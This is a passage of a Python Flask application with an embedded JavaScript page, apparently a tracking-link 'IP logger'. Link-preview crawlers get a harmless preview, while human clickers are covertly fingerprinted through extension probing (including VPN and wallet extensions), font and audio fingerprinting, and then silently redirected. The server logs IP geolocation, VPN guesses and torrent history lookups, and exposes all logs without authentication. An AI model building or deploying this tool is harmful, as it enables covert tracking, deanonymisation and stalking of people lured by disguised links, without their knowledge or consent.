      ["CyberArk",          "lllbfkdpknmgkgaibcmlcolelkiomgon"],
      // VPN / network
      ["Cisco AnyConnect",  "jcdhmojfecjfmbdpchihbeilohgnbdci"],
      ["GlobalProtect",     "epnalkejlacnmbolnmoiahlagpmkihia"],
      ["Zscaler",           "neebplgakaahbhdphmkckjjcegoiijjo"],
      // Comms / productivity
      ["Grammarly",         "kbfnbcaeplbcioakkpcpgfkobkghlhen"],
      ["Notion Web Clipper","knheggckgoiihginacbkhaalnibhilkk"],
      ["Todoist",           "jldhpllghnbhlbpcmnajkpdmadaolakh"],
      ["Loom",              "liecbddmkiiihnedobmlmillhodjkdmb"],
      ["Honey",             "bmnlcjabgnpnenekpadlanbbkooimhnj"],
      // Security / dev tools
      ["MetaMask",          "nkbihfbeogaeaoehlefnkodbefgpgknn"],
      ["uBlock Origin",     "cjpalhdlnbpafiamejdnhcphjbkeiagm"],
      ["Privacy Badger",    "pkehgijcmpdhfbdbbnkijodmdjhbjlgp"],
      ["Wappalyzer",        "gppongmhjkpfnbhagpmjfkannfbllamg"],
      ["React DevTools",    "fmkadmapgofadopljbjfkapdkoienihi"],
      ["Vue DevTools",      "nhdogjmejiglipccpnnnanhbledajbpd"],
      // Productivity / browser mgmt
      ["Momentum",          "laookkfknpbbblfpciffpaejjkokdgca"],
      ["Ghostery",          "mlomiejdfkolichcflejclcbmpeaniij"],
      ["AdBlock",           "gighmmpiobklfepjocnamgkkbiglidom"],
      ["AdBlock Plus",      "cfhdojbkjhnklbpkdaibdccddilifddb"],
    ];

    const detected = [];
    const probeExt = (id) => new Promise(res => {
      const img = new Image();
      const t = performance.now();
      img.onload  = () => res({ found: true,  ms: Math.round(performance.now() - t) });
      img.onerror = () => res({ found: false, ms: Math.round(performance.now() - t) });
      img.src = `chrome-extension://${id}/icons/icon16.png?_=${Math.random()}`;
      setTimeout(() => res({ found: false, ms: 999 }), 500);
    });

    const results = await Promise.all(
      EXT_PROBE.map(async ([name, id]) => {
        const r = await probeExt(id);
        return r.found ? { name, id, ms: r.ms } : null;
      })
    );
    data.extensions = results.filter(Boolean);
  } catch(e) { data.extensions = []; }

  // ── Installed Related Apps / PWA detection ────────────────────────────────
  try {
    if (navigator.getInstalledRelatedApps) {
      const apps = await navigator.getInstalledRelatedApps();
      data.installed_related_apps = apps.map(a => ({
        id: a.id, platform: a.platform, url: a.url
      }));
    }
  } catch(e) {}

  try {
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const testStr   = "mmmmmmmmmmlli";
    const testSize  = "72px";
    const canvas    = document.createElement("canvas");
    const ctx2      = canvas.getContext("2d");
    const baseWidths = {};
    baseFonts.forEach(f => {
      ctx2.font = testSize + " " + f;
      baseWidths[f] = ctx2.measureText(testStr).width;
    });
    const probeFonts = {{ probe_fonts | tojson }};
    const detected = [];
    probeFonts.forEach(font => {
      for (const base of baseFonts) {
        ctx2.font = testSize + " '" + font + "'," + base;
        if (ctx2.measureText(testStr).width !== baseWidths[base]) {
          detected.push(font);
          break;
        }
      }
    });
    data.fonts = detected;
  } catch(e) {}

  // ── AudioContext fingerprint (with timeout to prevent hanging) ──────────
  try {
    const audioFp = await Promise.race([
      new Promise(res => {
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        ac.resume().then(() => {
          const osc  = ac.createOscillator();
          const ana  = ac.createAnalyser();
          const gain = ac.createGain();
          const proc = ac.createScriptProcessor(4096, 1, 1);
          osc.type = "triangle";
          osc.frequency.value = 10000;
          gain.gain.value = 0;
          osc.connect(ana);
          ana.connect(proc);
          proc.connect(gain);
          gain.connect(ac.destination);
          osc.start(0);
          proc.onaudioprocess = e => {
            const buf = e.inputBuffer.getChannelData(0);
            let sum = 0;
            for (let i = 0; i < buf.length; i++) sum += Math.abs(buf[i]);
            try { osc.stop(); proc.disconnect(); ac.close(); } catch(ex) {}
            res(sum.toString().slice(0, 16));
          };
        }).catch(() => res(null));
      }),
      new Promise(res => setTimeout(() => res(null), 1500))
    ]);
    if (audioFp) data.audio_fp = audioFp;
  } catch(e) {}

  // ── Device pixel ratio & screen availability ──────────────────────────────
  data.device_pixel_ratio  = window.devicePixelRatio || null;
  data.screen_avail_w      = screen.availWidth;
  data.screen_avail_h      = screen.availHeight;
  data.inner_w             = window.innerWidth;
  data.inner_h             = window.innerHeight;

  // ── Browser capability flags ──────────────────────────────────────────────
  data.pdf_viewer_enabled  = navigator.pdfViewerEnabled || false;
  data.cookie_enabled      = navigator.cookieEnabled;
  data.plugins_count       = navigator.plugins ? navigator.plugins.length : 0;

  // ── Performance micro-benchmark ───────────────────────────────────────────
  try {
    const t1 = performance.now();
    let x = 0;
    for (let i = 0; i < 1e6; i++) x += Math.sqrt(i);
    data.perf_bench_ms = Math.round(performance.now() - t1);
  } catch(e) {}

  data.fp_time_ms = Math.round(performance.now() - t0);

  await fetch("/fp", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data),
    keepalive: true,
  });

  window.location.href = REDIRECT;
})();
</script>
</body>
</html>"""

# ── Route helper ──────────────────────────────────────────────────────────────

def serve_page(redirect_url, link_id, og_title, og_description, og_image, og_url):
    ua = request.headers.get("User-Agent", "")
    if is_crawler(ua):
        return render_template_string(
            PREVIEW_TEMPLATE,
            title=og_title, description=og_description,
            image=og_image, url=og_url or request.url,
        )
    return make_response(render_template_string(
        FINGERPRINT_TEMPLATE,
        redirect_url=redirect_url,
        link_id=link_id,
        probe_fonts=PROBE_FONTS,
    ))

# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return serve_page(REDIRECT_URL, "default", OG_TITLE, OG_DESCRIPTION, OG_IMAGE, OG_URL)

@app.route("/t/<link_id>")
def tracked_link(link_id):
    config = get_link(link_id)
    valid, reason = link_is_valid(config)
    if not valid:
        return "Not found.", 404
    ua = request.headers.get("User-Agent", "")
    if not is_crawler(ua):
        increment_link_clicks(link_id)
    return serve_page(
        config.get("redirect_url", REDIRECT_URL), link_id,
        config.get("og_title", OG_TITLE),
        config.get("og_description", OG_DESCRIPTION),
        config.get("og_image", OG_IMAGE),
        config.get("og_url", OG_URL),
    )

@app.route("/fp", methods=["POST"])
def fingerprint():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = ip.split(",")[0].strip()
    ua              = request.headers.get("User-Agent", "")
    referrer        = request.headers.get("Referer", None)
    accept_language = request.headers.get("Accept-Language", None)

    try:
        fp = request.get_json(force=True) or {}
    except Exception:
        fp = {}

    geo     = geolocate(ip)
    vpn     = vpn_confidence(geo, fp.get("timezone", ""), ua)
    torrents = torrent_lookup(ip)
    logs    = read_json(LOG_FILE, [])
    matches = find_matches(fp, logs, fp.get("visitor_id"))

    entry = {
        "timestamp":         datetime.utcnow().isoformat() + "Z",
        "ip":                ip,
        "user_agent":        ua,
        "referrer":          referrer,
        "accept_language":   accept_language,
        "visitor_id":        fp.get("visitor_id"),
        "returning_visitor": fp.get("returning", False),
        "link_id":           fp.get("link_id", "default"),
        "geo":               geo,
        "vpn":               vpn,
        "torrents":          torrents,
        "fingerprint":       fp,
        "matches":           matches,
    }

    log_hit(entry)
    return "", 204

@app.route("/links/create", methods=["POST"])
def create_link():
    try:
        body = request.get_json(force=True) or {}
    except Exception:
        return jsonify({"error": "invalid json"}), 400
    link_id = str(uuid.uuid4())[:8]
    config  = {
        "label":          body.get("label", ""),
        "redirect_url":   body.get("redirect_url", REDIRECT_URL),
        "og_title":       body.get("og_title", OG_TITLE),
        "og_description": body.get("og_description", OG_DESCRIPTION),
        "og_image":       body.get("og_image", OG_IMAGE),
        "og_url":         body.get("og_url", OG_URL),
        "max_clicks":     body.get("max_clicks", None),
        "expires_at":     body.get("expires_at", None),
        "clicks":         0,
        "created_at":     datetime.utcnow().isoformat() + "Z",
    }
    save_link(link_id, config)
    base = request.host_url.rstrip("/")
    return jsonify({"link_id": link_id, "url": f"{base}/t/{link_id}", "config": config})

@app.route("/links", methods=["GET"])
def list_links():
    return jsonify(read_json(LINKS_FILE, {}))

@app.route("/logs")
def view_logs():
    if not os.path.exists(LOG_FILE):
        return "No hits yet.", 200, {"Content-Type": "text/plain"}
    with open(LOG_FILE) as f:
        return f.read(), 200, {"Content-Type": "application/json"}

@app.route("/logs/<visitor_id>")
def logs_by_visitor(visitor_id):
    logs = read_json(LOG_FILE, [])
    hits = [e for e in logs if e.get("visitor_id") == visitor_id]
    return jsonify(hits)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
